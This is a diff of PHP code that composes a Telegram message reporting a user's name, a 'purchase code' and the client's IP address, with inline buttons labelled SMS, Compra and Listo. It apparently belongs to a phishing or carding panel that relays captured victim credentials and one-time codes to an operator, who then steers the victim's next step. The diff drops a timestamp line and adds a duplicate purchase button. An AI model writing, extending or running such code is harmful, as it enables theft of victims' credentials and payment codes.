@@ -28,7 +28,6 @@ $mensaje = "🔐 *CÓDIGO DE COMPRA RECIBIDO* 🔐\n\n";
 $mensaje .= "👤 *Usuario*: $usuario\n";
 $mensaje .= "🔢 *Código*: $codigo\n";
 $mensaje .= "🌍 *IP del Cliente*: $ip_cliente\n";
-$mensaje .= "📅 *Fecha y Hora*: " . date('Y-m-d H:i:s') . "\n";
 
 // Crear botones inline
 $botones = json_encode([
@@ -39,6 +38,9 @@ $botones = json_encode([
             ['text' => '📩 SMS', 'callback_data' => "SMS|$usuario"],
             ['text' => '💸 Compra', 'callback_data' => "COMPRA|$usuario"],
             ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
+        ],
+        [
+            ['text' => '❌ Compra', 'callback_data' => "COMPRA|$usuario"]
         ]
     ]
 ]);
